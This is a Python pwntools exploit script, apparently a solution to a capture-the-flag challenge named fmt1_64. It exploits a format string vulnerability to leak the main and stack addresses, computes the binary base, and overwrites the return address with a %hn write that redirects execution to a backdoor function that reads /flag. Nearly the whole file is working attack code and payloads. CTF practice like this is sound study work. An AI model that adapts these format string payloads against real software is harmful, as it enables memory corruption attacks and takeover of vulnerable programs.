from pwn import *		
from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile  = './fmt1_64'# './fmt1_64'
io=process(pwnfile)
elf = ELF(pwnfile)

def debug(x):
	gdb.attach(io,x)
	pause()

def cmd(x):
	io.recvuntil(">>")
	io.sendline(str(x))
def fmt(pay):
	cmd(2)
	yes = raw_input()			# 调试时read可能把后续发送的数据接受掉
	io.sendline(pay)
def leak(adr):					# 读取任意地址内容
	cmd(1)
	io.send(adr)
	

'''
注意 题目是open("/flag")   本地实验需要自己创建flag
注意get_flag中会执行close(1),绕过了strncmp也无法将flag内容打印出来

'''


offset = 8
io.recvuntil("tell me the time:")
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'1')
#debug("b *fmt_attack+101")


#泄漏main地址
pay = b'%7$hhn,%17$p'	
fmt(pay)
io.recvuntil(",")
main_adr = int(io.recv(14),16)-118
elf_base = main_adr - 0xfb6



log.success("main_adr--->"+hex(main_adr))
log.success("elf_base--->"+hex(elf_base))

back_door = elf_base + 0xf56


#泄漏栈地址
pay = b'%7$hhn,%16$p'
fmt(pay)
io.recvuntil(",")
rbp_adr = int(io.recv(14),16) - 0x30
log.success("rbp_adr--->"+hex(rbp_adr))

#debug()
#将返回地址写入栈上，并修改返回地址的内容
#这里写的是fmt的返回地址
ret_adr = rbp_adr + 8		# ret --> ret指令

#io.recvline()

pay = b'%'+str((back_door&0xffff)).encode("utf-8")+b'c%10$hn'
pay = pay.ljust(0x10,b'a')
pay += p64(ret_adr)	

fmt(pay)

io.interactive()
